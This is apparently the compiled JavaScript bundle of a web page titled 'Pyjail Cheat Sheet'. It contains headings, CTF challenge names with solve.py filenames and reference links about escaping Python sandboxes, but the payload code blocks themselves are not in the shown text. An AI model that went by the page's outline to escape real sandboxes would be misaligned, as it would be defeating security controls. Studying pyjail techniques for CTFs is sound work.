pi=p(_t);yc=r(pi,"solve.py"),pi.forEach(s),ti.forEach(s),ai.forEach(s),mo=i(n),$n=t(n,"PRE",{class:!0});var t_=p($n);t_.forEach(s),vo=i(n),Xn=t(n,"H3",{id:!0});var oi=p(Xn);da=t(oi,"A",{href:!0});var ei=p(da);bc=r(ei,"CrewCTF 2023: starship-1"),ei.forEach(s),oi.forEach(s),wo=i(n),Kn=t(n,"UL",{class:!0});var ci=p(Kn);ft=t(ci,"LI",{});var li=p(ft);dt=t(li,"CODE",{});var ui=p(dt);mc=r(ui,"sandbox.py"),ui.forEach(s),li.forEach(s),ci.forEach(s),go=i(n),Zn=t(n,"PRE",{class:!0});var p_=p(Zn);p_.forEach(s),Eo=i(n),Jn=t(n,"UL",{class:!0});var ii=p(Jn);yt=t(ii,"LI",{});var ki=p(yt);bt=t(ki,"CODE",{});var ri=p(bt);vc=r(ri,"solve.py"),ri.forEach(s),ki.forEach(s),ii.forEach(s),ho=i(n),Qn=t(n,"PRE",{class:!0});var o_=p(Qn);o_.forEach(s),xo=i(n),ns=t(n,"H3",{id:!0});var _i=p(ns);ya=t(_i,"A",{href:!0});var fi=p(ya);wc=r(fi,"CrewCTF 2023: starship"),fi.forEach(s),_i.forEach(s),Ao=i(n),ss=t(n,"UL",{class:!0});var di=p(ss);mt=t(di,"LI",{});var yi=p(mt);vt=t(yi,"CODE",{});var bi=p(vt);gc=r(bi,"solve.py"),bi.forEach(s),yi.forEach(s),di.forEach(s),Co=i(n),as=t(n,"PRE",{class:!0});var e_=p(as);e_.forEach(s),Lo=i(n),ts=t(n,"H3",{id:!0});var mi=p(ts);ba=t(mi,"A",{href:!0});var vi=p(ba);Ec=r(vi,"CrewCTF 2023: setjail"),vi.forEach(s),mi.forEach(s),To=i(n),ps=t(n,"UL",{class:!0});var wi=p(ps);wt=t(wi,"LI",{});var gi=p(wt);gt=t(gi,"CODE",{});var Ei=p(gt);hc=r(Ei,"solve.py"),Ei.forEach(s),gi.forEach(s),wi.forEach(s),Fo=i(n),os=t(n,"PRE",{class:!0});var c_=p(os);c_.forEach(s),Ho=i(n),es=t(n,"H3",{id:!0});var hi=p(es);ma=t(hi,"A",{href:!0});var xi=p(ma);xc=r(xi,"BYUCTF 2023: Builtins 1"),xi.forEach(s),hi.forEach(s),Ro=i(n),cs=t(n,"UL",{class:!0});var Ai=p(cs);Et=t(Ai,"LI",{});var Ci=p(Et);ht=t(Ci,"CODE",{});var Li=p(ht);Ac=r(Li,"b1.py"),Li.forEach(s),Ci.forEach(s),Ai.forEach(s),Do=i(n),ls=t(n,"PRE",{class:!0});var l_=p(ls);l_.forEach(s),Io=i(n),us=t(n,"UL",{class:!0});var Ti=p(us);xt=t(Ti,"LI",{});var Fi=p(xt);At=t(Fi,"CODE",{});var Hi=p(At);Cc=r(Hi,"solve.py"),Hi.forEach(s),Fi.forEach(s),Ti.forEach(s),Po=i(n),is=t(n,"PRE",{class:!0});var u_=p(is);u_.forEach(s),Oo=i(n),ks=t(n,"H3",{id:!0});var Ri=p(ks);va=t(Ri,"A",{href:!0});var Di=p(va);Lc=r(Di,"BYUCTF 2023: Builtins 2"),Di.forEach(s),Ri.forEach(s),Uo=i(n),rs=t(n,"UL",{class:!0});var Ii=p(rs);Ct=t(Ii,"LI",{});var Pi=p(Ct);Lt=t(Pi,"CODE",{});var Oi=p(Lt);Tc=r(Oi,"b2.py"),Oi.forEach(s),Pi.forEach(s),Ii.forEach(s),Bo=i(n),_s=t(n,"PRE",{class:!0});var i_=p(_s);i_.forEach(s),Mo=i(n),fs=t(n,"UL",{class:!0});var Ui=p(fs);Tt=t(Ui,"LI",{});var Bi=p(Tt);Ft=t(Bi,"CODE",{});var Mi=p(Ft);Fc=r(Mi,"solve.py"),Mi.forEach(s),Bi.forEach(s),Ui.forEach(s),qo=i(n),ds=t(n,"PRE",{class:!0});var k_=p(ds);k_.forEach(s),No=i(n),ys=t(n,"H3",{id:!0});var qi=p(ys);wa=t(qi,"A",{href:!0});var Ni=p(wa);Hc=r(Ni,"BYUCTF 2023: a-z0-9"),Ni.forEach(s),qi.forEach(s),jo=i(n),bs=t(n,"UL",{class:!0});var ji=p(bs);Ht=t(ji,"LI",{});var Si=p(Ht);Rt=t(Si,"CODE",{});var zi=p(Rt);Rc=r(zi,"a-z0-9.py"),zi.forEach(s),Si.forEach(s),ji.forEach(s),So=i(n),ms=t(n,"PRE",{class:!0});var r_=p(ms);r_.forEach(s),zo=i(n),vs=t(n,"UL",{class:!0});var Yi=p(vs);Dt=t(Yi,"LI",{});var Wi=p(Dt);It=t(Wi,"CODE",{});var Vi=p(It);Dc=r(Vi,"solve.py"),Vi.forEach(s),Wi.forEach(s),Yi.forEach(s),Yo=i(n),ws=t(n,"PRE",{class:!0});var __=p(ws);__.forEach(s),Wo=i(n),gs=t(n,"H3",{id:!0});var Gi=p(gs);ga=t(Gi,"A",{href:!0});var $i=p(ga);Ic=r($i,"BYUCTF 2023: Leet 1"),$i.forEach(s),Gi.forEach(s),Vo=i(n),Es=t(n,"UL",{class:!0});var Xi=p(Es);Pt=t(Xi,"LI",{});var Ki=p(Pt);Ot=t(Ki,"CODE",{});var Zi=p(Ot);Pc=r(Zi,"leet1.py"),Zi.forEach(s),Ki.forEach(s),Xi.forEach(s),Go=i(n),hs=t(n,"PRE",{class:!0});var f_=p(hs);f_.forEach(s),$o=i(n),xs=t(n,"UL",{class:!0});var Ji=p(xs);Ut=t(Ji,"LI",{});var Qi=p(Ut);Bt=t(Qi,"CODE",{});var nk=p(Bt);Oc=r(nk,"solve.py"),nk.forEach(s),Qi.forEach(s),Ji.forEach(s),Xo=i(n),As=t(n,"PRE",{class:!0});var d_=p(As);d_.forEach(s),Ko=i(n),Cs=t(n,"H3",{id:!0});var sk=p(Cs);Ea=t(sk,"A",{href:!0});var ak=p(Ea);Uc=r(ak,"BYUCTF 2023: Leet 2"),ak.forEach(s),sk.forEach(s),Zo=i(n),Ls=t(n,"UL",{class:!0});var tk=p(Ls);Mt=t(tk,"LI",{});var pk=p(Mt);qt=t(pk,"CODE",{});var ok=p(qt);Bc=r(ok,"leet2.py"),ok.forEach(s),pk.forEach(s),tk.forEach(s),Jo=i(n),Ts=t(n,"PRE",{class:!0});var y_=p(Ts);y_.forEach(s),Qo=i(n),Fs=t(n,"UL",{class:!0});var ek=p(Fs);Nt=t(ek,"LI",{});var ck=p(Nt);jt=t(ck,"CODE",{});var lk=p(jt);Mc=r(lk,"solve.py"),lk.forEach(s),ck.forEach(s),ek.forEach(s),ne=i(n),Hs=t(n,"PRE",{class:!0});var b_=p(Hs);b_.forEach(s),se=i(n),Rs=t(n,"H3",{id:!0});var uk=p(Rs);ha=t(uk,"A",{href:!0});var ik=p(ha);qc=r(ik,"BYUCTF 2023: abcdefghijklm"),ik.forEach(s),uk.forEach(s),ae=i(n),Ds=t(n,"UL",{class:!0});var kk=p(Ds);St=t(kk,"LI",{});var rk=p(St);zt=t(rk,"CODE",{});var _k=p(zt);Nc=r(_k,"abcdefghijklm.py"),_k.forEach(s),rk.forEach(s),kk.forEach(s),te=i(n),Is=t(n,"PRE",{class:!0});var m_=p(Is);m_.forEach(s),pe=i(n),Ps=t(n,"UL",{class:!0});var fk=p(Ps);Yt=t(fk,"LI",{});var dk=p(Yt);Wt=t(dk,"CODE",{});var yk=p(Wt);jc=r(yk,"solve.py"),yk.forEach(s),dk.forEach(s),fk.forEach(s),oe=i(n),Os=t(n,"PRE",{class:!0});var v_=p(Os);v_.forEach(s),ee=i(n),Us=t(n,"H3",{id:!0});var bk=p(Us);xa=t(bk,"A",{href:!0});var mk=p(xa);Sc=r(mk,"BYUCTF 2023: nopqrstuvwxyz"),mk.forEach(s),bk.forEach(s),ce=i(n),Bs=t(n,"UL",{class:!0});var vk=p(Bs);Vt=t(vk,"LI",{});var wk=p(Vt);Gt=t(wk,"CODE",{});var gk=p(Gt);zc=r(gk,"nopqrstuvwxyz.py"),gk.forEach(s),wk.forEach(s),vk.forEach(s),le=i(n),Ms=t(n,"PRE",{class:!0});var w_=p(Ms);w_.forEach(s),ue=i(n),qs=t(n,"UL",{class:!0});var Ek=p(qs);$t=t(Ek,"LI",{});var hk=p($t);Xt=t(hk,"CODE",{});var xk=p(Xt);Yc=r(xk,"solve.py"),xk.forEach(s),hk.forEach(s),Ek.forEach(s),ie=i(n),Ns=t(n,"PRE",{class:!0});var g_=p(Ns);g_.forEach(s),ke=i(n),js=t(n,"H2",{id:!0});var Ak=p(js);Aa=t(Ak,"A",{href:!0});var Ck=p(Aa);Wc=r(Ck,"References"),Ck.forEach(s),Ak.forEach(s),re=i(n),m=t(n,"UL",{class:!0});var Ca=p(m);Kt=t(Ca,"LI",{});var Lk=p(Kt);L=t(Lk,"A",{href:!0,rel:!0,class:!0,target:!0});var Tk=p(L);Vc=r(Tk,"https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes"),Tk.forEach(s),Lk.forEach(s),Gc=i(Ca),Zt=t(Ca,"LI",{});var Fk=p(Zt);T=t(Fk,"A",{href:!0,rel:!0,class:!0,target:!0});var Hk=p(T);$c=r(Hk,"https://github.com/salvatore-abello/python-ctf-cheatsheet/blob/main/pyjails/README.md"),Hk.forEach(s),Fk.forEach(s),Xc=i(Ca),Jt=t(Ca,"LI",{});var Rk=p(Jt);F=t(Rk,"A",{href:!0,rel:!0,class:!0,target:!0});var Dk=p(F);Kc=r(Dk,"https://jbnrz.com.cn/index.php/2024/05/19/pyjail/"),Dk.forEach(s),Rk.forEach(s),Ca.forEach(s),this.h()},h(){l(d,"href","#sinks"),l(_,"id","sinks"),l(Ys,"href","#retrieving-builtins"),l(R,"id","retrieving-builtins"),l(D,"class","language-py"),l(Ws,"href","#good-to-know-built-in-functions-and-methods"),l(I,"id","good-to-know-built-in-functions-and-methods"),l(P,"class","language-py"),l(Vs,"href","#subclasses"),l(O,"id","subclasses"),l(U,"class","language-py"),l(Gs,"href","#popular-modules"),l(B,"id","popular-modules"),l(M,"class","language-py"),l($s,"href","#bypasses-and-payloads"),l(q,"id","bypasses-and-payloads"),l(Xs,"href","#decorators"),l(N,"id","decorators"),l(j,"class","language-py"),l(Ks,"href","#unicode-bypass"),l(S,"id","unicode-bypass"),l(z,"class","language-py"),l(Zs,"href","#assigning-fields-and-variables"),l(Y,"id","assigning-fields-and-variables"),l(W,"class","language-py"),l(V,"class","language-py"),l(Js,"href","#deleting-variables"),l(G,"id","deleting-variables"),l($,"class","language-py"),l(Qs,"href","#getting-attributes-without-dot"),l(X,"id","getting-attributes-without-dot"),l(K,"class","language-py"),l(na,"href","#getting-attributes-without-underscore"),l(Z,"id","getting-attributes-without-underscore"),l(J,"class","language-py"),l(sa,"href","#running-functions-and-methods-without-parenthesis"),l(Q,"id","running-functions-and-methods-without-parenthesis"),l(nn,"class","language-py"),l(aa,"href","#general-stuff"),l(sn,"id","general-stuff"),l(ta,"href","#environment-variables"),l(an,"id","environment-variables"),l(E,"href","https://www.elttam.com/blog/env/#python"),l(E,"rel","noopener"),l(E,"class","text-link"),l(E,"target","_blank"),l(g,"class","list"),l(pa,"href","#magic-methods"),l(tn,"id","magic-methods"),l(h,"href","https://rszalski.github.io/magicmethods/#appendix1"),l(h,"rel","noopener"),l(h,"class","text-link"),l(h,"target","_blank"),l(pn,"class","list"),l(oa,"href","#stable-payloads"),l(on,"id","stable-payloads"),l(en,"class","language-py"),l(ea,"href","#finding-sinks-from-modules"),l(cn,"id","finding-sinks-from-modules"),l(A,"href","https://github.com/search?q=repo%3Apython%2Fcpython+path%3ALib+%2Ffrom+os+import+environ%2F&type=code"),l(A,"rel","noopener"),l(A,"class","text-link"),l(A,"target","_blank"),l(C,"href","https://github.com/search?q=repo%3Apython%2Fcpython+path%3ALib+%2Fimport+sys%2F&type=code"),l(C,"rel","noopener"),l(C,"class","text-link"),l(C,"target","_blank"),l(x,"class","list"),l(ca,"href","#ctf"),l(ln,"id","ctf"),l(la,"href","#vsctf-2024-llama-jail-revenge"),l(un,"id","vsctf-2024-llama-jail-revenge"),l(kn,"class","list"),l(rn,"class","language-py"),l(_n,"class","list"),l(fn,"class","language-py"),l(dn,"class","list"),l(yn,"class","language-py"),l(ua,"href","#glacierctf-2023-avatar"),l(bn,"id","glacierctf-2023-avatar"),l(mn,"class","list"),l(vn,"class","language-py"),l(wn,"class","list"),l(gn,"class","language-py"),l(ia,"href","#tfc-ctf-2023-my-third-calculator"),l(En,"id","tfc-ctf-2023-my-third-calculator"),l(hn,"class","list"),l(xn,"class","language-py"),l(An,"class","list"),l(Cn,"class","language-py"),l(ka,"href","#equinor-ctf-2023-dis-is-it"),l(Ln,"id","equinor-ctf-2023-dis-is-it"),l(Tn,"class","list"),l(Fn,"class","language-py"),l(Hn,"class","list"),l(Rn,"class","language-py"),l(ra,"href","#37c3-potluck-ctf-tacocat"),l(Dn,"id","37c3-potluck-ctf-tacocat"),l(In,"class","list"),l(Pn,"class","language-py"),l(On,"class","list"),l(Un,"class","language-py"),l(_a,"href","#internet-festival-2023-ctf-finals-prison"),l(Bn,"id","internet-festival-2023-ctf-finals-prison"),l(Mn,"class","list"),l(qn,"class","language-py"),l(Nn,"class","list"),l(jn,"class","language-py"),l(fa,"href","#wacon-2023-prequal-scavengerhunt"),l(Sn,"id","wacon-2023-prequal-scavengerhunt"),l(zn,"class","list"),l(Yn,"class","language-py"),l(Wn,"class","list"),l(Vn,"class","language-py"),l(Gn,"class","list"),l($n,"class","language-py"),l(da,"href","#crewctf-2023-starship-1"),l(Xn,"id","crewctf-2023-starship-1"),l(Kn,"class","list"),l(Zn,"class","language-py"),l(Jn,"class","list"),l(Qn,"class","language-py"),l(ya,"href","#crewctf-2023-starship"),l(ns,"id","crewctf-2023-starship"),l(ss,"class","list"),l(as,"class","language-py"),l(ba,"href","#crewctf-2023-setjail"),l(ts,"id","crewctf-2023-setjail"),l(ps,"class","list"),l(os,"class","language-py"),l(ma,"href","#byuctf-2023-builtins-1"),l(es,"id","byuctf-2023-builtins-1"),l(cs,"class","list"),l(ls,"class","language-py"),l(us,"class","list"),l(is,"class","language-py"),l(va,"href","#byuctf-2023-builtins-2"),l(ks,"id","byuctf-2023-builtins-2"),l(rs,"class","list"),l(_s,"class","language-py"),l(fs,"class","list"),l(ds,"class","language-py"),l(wa,"href","#byuctf-2023-a-z0-9"),l(ys,"id","byuctf-2023-a-z0-9"),l(bs,"class","list"),l(ms,"class","language-py"),l(vs,"class","list"),l(ws,"class","language-py"),l(ga,"href","#byuctf-2023-leet-1"),l(gs,"id","byuctf-2023-leet-1"),l(Es,"class","list"),l(hs,"class","language-py"),l(xs,"class","list"),l(As,"class","language-py"),l(Ea,"href","#byuctf-2023-leet-2"),l(Cs,"id","byuctf-2023-leet-2"),l(Ls,"class","list"),l(Ts,"class","language-py"),l(Fs,"class","list"),l(Hs,"class","language-py"),l(ha,"href","#byuctf-2023-abcdefghijklm"),l(Rs,"id","byuctf-2023-abcdefghijklm"),l(Ds,"class","list"),l(Is,"class","language-py"),l(Ps,"class","list"),l(Os,"class","language-py"),l(xa,"href","#byuctf-2023-nopqrstuvwxyz"),l(Us,"id","byuctf-2023-nopqrstuvwxyz"),l(Bs,"class","list"),l(Ms,"class","language-py"),l(qs,"class","list"),l(Ns,"class","language-py"),l(Aa,"href","#references"),l(js,"id","references"),l(L,"href","https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes"),l(L,"rel","noopener"),l(L,"class","text-link"),l(L,"target","_blank"),l(T,"href","https://github.com/salvatore-abello/python-ctf-cheatsheet/blob/main/pyjails/README.md"),l(T,"rel","noopener"),l(T,"class","text-link"),l(T,"target","_blank"),l(F,"href","https://jbnrz.com.cn/index.php/2024/05/19/pyjail/"),l(F,"rel","noopener"),l(F,"class","text-link"),l(F,"target","_blank"),l(m,"class","list")},m(n,o){e(n,f,o),c(f,b),c(b,w),e(n,H,o),e(n,_,o),c(_,d),c(d,zs),e(n,Qt,o),e(n,R,o),c(R,Ys),c(Ys,de),e(n,np,o),e(n,D,o),D.innerHTML=Uk,e(n,sp,o),e(n,I,o),c(I,Ws),c(Ws,ye),e(n,ap,o),e(n,P,o),P.innerHTML=Bk,e(n,tp,o),e(n,O,o),c(O,Vs),c(Vs,be),e(n,pp,o),e(n,U,o),U.innerHTML=Mk,e(n,op,o),e(n,B,o),c(B,Gs),c(Gs,me),e(n,ep,o),e(n,M,o),M.innerHTML=qk,e(n,cp,o),e(n,q,o),c(q,$s),c($s,ve),e(n,lp,o),e(n,N,o),c(N,Xs),c(Xs,we),e(n,up,o),e(n,j,o),j.innerHTML=Nk,e(n,ip,o),e(n,S,o),c(S,Ks),c(Ks,ge),e(n,kp,o),e(n,z,o),z.innerHTML=jk,e(n,rp,o),e(n,Y,o),c(Y,Zs),c(Zs,Ee),e(n,_p,o),e(n,W,o),W.innerHTML=Sk,e(n,fp,o),e(n,V,o),V.innerHTML=zk,e(n,dp,o),e(n,G,o),c(G,Js),c(Js,he),e(n,yp,o),e(n,$,o),$.innerHTML=Yk,e(n,bp,o),e(n,X,o),c(X,Qs),c(Qs,xe),e(n,mp,o),e(n,K,o),K.innerHTML=Wk,e(n,vp,o),e(n,Z,o),c(Z,na),c(na,Ae),e(n,wp,o),e(n,J,o),J.innerHTML=Vk,e(n,gp,o),e(n,Q,o),c(Q,sa),c(sa,Ce),e(n,Ep,o),e(n,nn,o),nn.innerHTML=Gk,e(n,hp,o),e(n,sn,o),c(sn,aa),c(aa,Le),e(n,xp,o),e(n,an,o),c(an,ta),c(ta,Te),e(n,Ap,o),e(n,g,o),c(g,La),c(La,E),c(E,Fe),c(g,He),c(g,y),c(y,Ta),c(Ta,Re),c(y,De),c(y,Fa),c(Fa,Ie),c(y,Pe),c(y,Ha),c(Ha,Oe),c(y,Ue),c(y,Ra),c(Ra,Be),c(y,Me),c(y,Da),c(Da,qe),e(n,Cp,o),e(n,tn,o),c(tn,pa),c(pa,Ne),e(n,Lp,o),e(n,pn,o),c(pn,Ia),c(Ia,h),c(h,je),e(n,Tp,o),e(n,on,o),c(on,oa),c(oa,Se),e(n,Fp,o),e(n,en,o),en.innerHTML=$k,e(n,Hp,o),e(n,cn,o),c(cn,ea),c(ea,ze),e(n,Rp,o),e(n,x,o),c(x,Pa),c(Pa,A),c(A,Ye),c(x,We),c(x,Oa),c(Oa,C),c(C,Ve),e(n,Dp,o),e(n,ln,o),c(ln,ca),c(ca,Ge),e(n,Ip,o),e(n,un,o),c(un,la),c(la,$e),e(n,Pp,o),e(n,kn,o),c(kn,Ua),c(Ua,Ba),c(Ba,Xe),e(n,Op,o),e(n,rn,o),rn.innerHTML=Xk,e(n,Up,o),e(n,_n,o),c(_n,Ma),c(Ma,qa),c(qa,Ke),e(n,Bp,o),e(n,fn,o),fn.innerHTML=Kk,e(n,Mp,o),e(n,dn,o),c(dn,Na),c(Na,ja),c(ja,Ze),e(n,qp,o),e(n,yn,o),yn.innerHTML=Zk,e(n,Np,o),e(n,bn,o),c(bn,ua),c(ua,Je),e(n,jp,o),e(n,mn,o),c(mn,Sa),c(Sa,za),c(za,Qe),e(n,Sp,o),e(n,vn,o),vn.innerHTML=Jk,e(n,zp,o),e(n,wn,o),c(wn,Ya),c(Ya,Wa),c(Wa,nc),e(n,Yp,o),e(n,gn,o),gn.innerHTML=Qk,e(n,Wp,o),e(n,En,o),c(En,ia),c(ia,sc),e(n,Vp,o),e(n,hn,o),c(hn,Va),c(Va,Ga),c(Ga,ac),e(n,Gp,o),e(n,xn,o),xn.innerHTML=nr,e(n,$p,o),e(n,An,o),c(An,$a),c($a,Xa),c(Xa,tc),e(n,Xp,o),e(n,Cn,o),Cn.innerHTML=sr,e(n,Kp,o),e(n,Ln,o),c(Ln,ka),c(ka,pc),e(n,Zp,o),e(n,Tn,o),c(Tn,Ka),c(Ka,Za),c(Za,oc),e(n,Jp,o),e(n,Fn,o),Fn.innerHTML=ar,e(n,Qp,o),e(n,Hn,o),c(Hn,Ja),c(Ja,Qa),c(Qa,ec),e(n,no,o),e(n,Rn,o),Rn.innerHTML=tr,e(n,so,o),e(n,Dn,o),c(Dn,ra),c(ra,cc),e(n,ao,o),e(n,In,o),c(In,nt),c(nt,st),c(st,lc),e(n,to,o),e(n,Pn,o),Pn.innerHTML=pr,e(n,po,o),e(n,On,o),c(On,at),c(at,tt),c(tt,uc),e(n,oo,o),e(n,Un,o),Un.innerHTML=or,e(n,eo,o),e(n,Bn,o),c(Bn,_a),c(_a,ic),e(n,co,o),e(n,Mn,o),c(Mn,pt),c(pt,ot),c(ot,kc),e(n,lo,o),e(n,qn,o),qn.innerHTML=er,e(n,uo,o),e(n,Nn,o),c(Nn,et),c(et,ct),c(ct,rc),e(n,io,o),e(n,jn,o),jn.innerHTML=cr,e(n,ko,o),e(n,Sn,o),c(Sn,fa),c(fa,_c),e(n,ro,o),e(n,zn,o),c(zn,lt),c(lt,ut),c(ut,fc),e(n,_o,o),e(n,Yn,o),Yn.innerHTML=lr,e(n,fo,o),e(n,Wn,o),c(Wn,it),c(it,kt),c(kt,dc),e(n,yo,o),e(n,Vn,o),Vn.innerHTML=ur,e(n,bo,o),e(n,Gn,o),c(Gn,rt),c(rt,_t),c(_t,yc),e(n,mo,o),e(n,$n,o),$n.innerHTML=ir,e(n,vo,o),e(n,Xn,o),c(Xn,da),c(da,bc),e(n,wo,o),e(n,Kn,o),c(Kn,ft),c(ft,dt),c(dt,mc),e(n,go,o),e(n,Zn,o),Zn.innerHTML=kr,e(n,Eo,o),e(n,Jn,o),c(Jn,yt),c(yt,bt),c(bt,vc),e(n,ho,o),e(n,Qn,o),Qn.innerHTML=rr,e(n,xo,o),e(n,ns,o),c(ns,ya),c(ya,wc),e(n,Ao,o),e(n,ss,o),c(ss,mt),c(mt,vt),c(vt,gc),e(n,Co,o),e(n,as,o),as.innerHTML=_r,e(n,Lo,o),e(n,ts,o),c(ts,ba),c(ba,Ec),e(n,To,o),e(n,ps,o),c(ps,wt),c(wt,gt),c(gt,hc),e(n,Fo,o),e(n,os,o),os.innerHTML=fr,e(n,Ho,o),e(n,es,o),c(es,ma),c(ma,xc),e(n,Ro,o),e(n,cs,o),c(cs,Et),c(Et,ht),c(ht,Ac),e(n,Do,o),e(n,ls,o),ls.innerHTML=dr,e(n,Io,o),e(n,us,o),c(us,xt),c(xt,At),c(At,Cc),e(n,Po,o),e(n,is,o),is.innerHTML=yr,e(n,Oo,o),e(n,ks,o),c(ks,va),c(va,Lc),e(n,Uo,o),e(n,rs,o),c(rs,Ct),c(Ct,Lt),c(Lt,Tc),e(n,Bo,o),e(n,_s,o),_s.innerHTML=br,e(n,Mo,o),e(n,fs,o),c(fs,Tt),c(Tt,Ft),c(Ft,Fc),e(n,qo,o),e(n,ds,o),ds.innerHTML=mr,e(n,No,o),e(n,ys,o),c(ys,wa),c(wa,Hc),e(n,jo,o),e(n,bs,o),c(bs,Ht),c(Ht,Rt),c(Rt,Rc),e(n,So,o),e(n,ms,o),ms.innerHTML=vr,e(n,zo,o),e(n,vs,o),c(vs,Dt),c(Dt,It),c(It,Dc),e(n,Yo,o),e(n,ws,o),ws.innerHTML=wr,e(n,Wo,o),e(n,gs,o),c(gs,ga),c(ga,Ic),e(n,Vo,o),e(n,Es,o),c(Es,Pt),c(Pt,Ot),c(Ot,Pc),e(n,Go,o),e(n,hs,o),hs.innerHTML=gr,e(n,$o,o),e(n,xs,o),c(xs,Ut),c(Ut,Bt),c(Bt,Oc),e(n,Xo,o),e(n,As,o),As.innerHTML=Er,e(n,Ko,o),e(n,Cs,o),c(Cs,Ea),c(Ea,Uc),e(n,Zo,o),e(n,Ls,o),c(Ls,Mt),c(Mt,qt),c(qt,Bc),e(n,Jo,o),e(n,Ts,o),Ts.innerHTML=hr,e(n,Qo,o),e(n,Fs,o),c(Fs,Nt),c(Nt,jt),c(jt,Mc),e(n,ne,o),e(n,Hs,o),Hs.innerHTML=xr,e(n,se,o),e(n,Rs,o),c(Rs,ha),c(ha,qc),e(n,ae,o),e(n,Ds,o),c(Ds,St),c(St,zt),c(zt,Nc),e(n,te,o),e(n,Is,o),Is.innerHTML=Ar,e(n,pe,o),e(n,Ps,o),c(Ps,Yt),c(Yt,Wt),c(Wt,jc),e(n,oe,o),e(n,Os,o),Os.innerHTML=Cr,e(n,ee,o),e(n,Us,o),c(Us,xa),c(xa,Sc),e(n,ce,o),e(n,Bs,o),c(Bs,Vt),c(Vt,Gt),c(Gt,zc),e(n,le,o),e(n,Ms,o),Ms.innerHTML=Lr,e(n,ue,o),e(n,qs,o),c(qs,$t),c($t,Xt),c(Xt,Yc),e(n,ie,o),e(n,Ns,o),Ns.innerHTML=Tr,e(n,ke,o),e(n,js,o),c(js,Aa),c(Aa,Wc),e(n,re,o),e(n,m,o),c(m,Kt),c(Kt,L),c(L,Vc),c(m,Gc),c(m,Zt),c(Zt,T),c(T,$c),c(m,Xc),c(m,Jt),c(Jt,F),c(F,Kc)},p:D_,d(n){n&&s(f),n&&s(H),n&&s(_),n&&s(Qt),n&&s(R),n&&s(np),n&&s(D),n&&s(sp),n&&s(I),n&&s(ap),n&&s(P),n&&s(tp),n&&s(O),n&&s(pp),n&&s(U),n&&s(op),n&&s(B),n&&s(ep),n&&s(M),n&&s(cp),n&&s(q),n&&s(lp),n&&s(N),n&&s(up),n&&s(j),n&&s(ip),n&&s(S),n&&s(kp),n&&s(z),n&&s(rp),n&&s(Y),n&&s(_p),n&&s(W),n&&s(fp),n&&s(V),n&&s(dp),n&&s(G),n&&s(yp),n&&s($),n&&s(bp),n&&s(X),n&&s(mp),n&&s(K),n&&s(vp),n&&s(Z),n&&s(wp),n&&s(J),n&&s(gp),n&&s(Q),n&&s(Ep),n&&s(nn),n&&s(hp),n&&s(sn),n&&s(xp),n&&s(an),n&&s(Ap),n&&s(g),n&&s(Cp),n&&s(tn),n&&s(Lp),n&&s(pn),n&&s(Tp),n&&s(on),n&&s(Fp),n&&s(en),n&&s(Hp),n&&s(cn),n&&s(Rp),n&&s(x),n&&s(Dp),n&&s(ln),n&&s(Ip),n&&s(un),n&&s(Pp),n&&s(kn),n&&s(Op),n&&s(rn),n&&s(Up),n&&s(_n),n&&s(Bp),n&&s(fn),n&&s(Mp),n&&s(dn),n&&s(qp),n&&s(yn),n&&s(Np),n&&s(bn),n&&s(jp),n&&s(mn),n&&s(Sp),n&&s(vn),n&&s(zp),n&&s(wn),n&&s(Yp),n&&s(gn),n&&s(Wp),n&&s(En),n&&s(Vp),n&&s(hn),n&&s(Gp),n&&s(xn),n&&s($p),n&&s(An),n&&s(Xp),n&&s(Cn),n&&s(Kp),n&&s(Ln),n&&s(Zp),n&&s(Tn),n&&s(Jp),n&&s(Fn),n&&s(Qp),n&&s(Hn),n&&s(no),n&&s(Rn),n&&s(so),n&&s(Dn),n&&s(ao),n&&s(In),n&&s(to),n&&s(Pn),n&&s(po),n&&s(On),n&&s(oo),n&&s(Un),n&&s(eo),n&&s(Bn),n&&s(co),n&&s(Mn),n&&s(lo),n&&s(qn),n&&s(uo),n&&s(Nn),n&&s(io),n&&s(jn),n&&s(ko),n&&s(Sn),n&&s(ro),n&&s(zn),n&&s(_o),n&&s(Yn),n&&s(fo),n&&s(Wn),n&&s(yo),n&&s(Vn),n&&s(bo),n&&s(Gn),n&&s(mo),n&&s($n),n&&s(vo),n&&s(Xn),n&&s(wo),n&&s(Kn),n&&s(go),n&&s(Zn),n&&s(Eo),n&&s(Jn),n&&s(ho),n&&s(Qn),n&&s(xo),n&&s(ns),n&&s(Ao),n&&s(ss),n&&s(Co),n&&s(as),n&&s(Lo),n&&s(ts),n&&s(To),n&&s(ps),n&&s(Fo),n&&s(os),n&&s(Ho),n&&s(es),n&&s(Ro),n&&s(cs),n&&s(Do),n&&s(ls),n&&s(Io),n&&s(us),n&&s(Po),n&&s(is),n&&s(Oo),n&&s(ks),n&&s(Uo),n&&s(rs),n&&s(Bo),n&&s(_s),n&&s(Mo),n&&s(fs),n&&s(qo),n&&s(ds),n&&s(No),n&&s(ys),n&&s(jo),n&&s(bs),n&&s(So),n&&s(ms),n&&s(zo),n&&s(vs),n&&s(Yo),n&&s(ws),n&&s(Wo),n&&s(gs),n&&s(Vo),n&&s(Es),n&&s(Go),n&&s(hs),n&&s($o),n&&s(xs),n&&s(Xo),n&&s(As),n&&s(Ko),n&&s(Cs),n&&s(Zo),n&&s(Ls),n&&s(Jo),n&&s(Ts),n&&s(Qo),n&&s(Fs),n&&s(ne),n&&s(Hs),n&&s(se),n&&s(Rs),n&&s(ae),n&&s(Ds),n&&s(te),n&&s(Is),n&&s(pe),n&&s(Ps),n&&s(oe),n&&s(Os),n&&s(ee),n&&s(Us),n&&s(ce),n&&s(Bs),n&&s(le),n&&s(Ms),n&&s(ue),n&&s(qs),n&&s(ie),n&&s(Ns),n&&s(ke),n&&s(js),n&&s(re),n&&s(m)}}}function O_(Ss){let f,b;const w=[Ss[0],Ok];let H={$$slots:{default:[P_]},$$scope:{ctx:Ss}};for(let _=0;_<w.length;_+=1)H=Zc(H,w[_]);return f=new I_({props:H}),{c(){A_(f.$$.fragment)},l(_){C_(f.$$.fragment,_)},m(_,d){L_(f,_,d),b=!0},p(_,[d]){const zs=d&1?T_(w,[d&1&&Ik(_[0]),d&0&&Ik(Ok)]):{};d&2&&(zs.$$scope={dirty:d,ctx:_}),f.$set(zs)},i(_){b||(F_(f.$$.fragment,_),b=!0)},o(_){H_(f.$$.fragment,_),b=!1},d(_){R_(f,_)}}}const Ok={title:"Pyjail Cheat Sheet",date:"2024-06-16",category:"cheatsheet",description:"",tags:["python3","sandbox","dunder methods"]};function U_(Ss,f,b){return 